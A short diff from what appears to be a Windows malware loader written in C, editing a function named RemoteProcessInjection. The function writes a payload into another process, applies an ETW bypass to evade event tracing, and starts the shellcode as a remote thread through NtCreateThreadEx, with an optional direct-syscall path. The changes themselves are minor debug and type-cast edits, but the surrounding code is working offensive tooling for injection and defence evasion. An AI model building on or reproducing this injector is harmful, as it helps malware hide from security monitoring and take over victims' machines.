@@ -50,7 +50,6 @@ BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pPayloa
 	if (!payload_loading(&pShellcodeAddress, pPayload, sPayloadSize, hProcess, szProcessName)) {
 		return FALSE;
 	}
-	PrintMemoryBytes(hProcess, pShellcodeAddress, 20);
 	
 	//	apply ETW bypass
 	if (!applyEtwBypass(hProcess)) {
@@ -66,9 +65,9 @@ BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pPayloa
 	}
 
 	// Running the shellcode as a new thread's entry in the remote process
-	DebugPrint("[i] Executing Payload ... ");
+	DebugPrint("[i] Executing Payload...\n");
 #ifdef SYSCALL_ENABLED	
-	status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pShellcodeAddress, NULL, FALSE, 0, 0, 0, NULL);
+	status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pShellcodeAddress, NULL, FALSE, 0, (SIZE_T)0, (SIZE_T)0, NULL);
 	if(!NT_SUCCESS(status)) {
 		DebugPrint("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", status);
 		return -1;
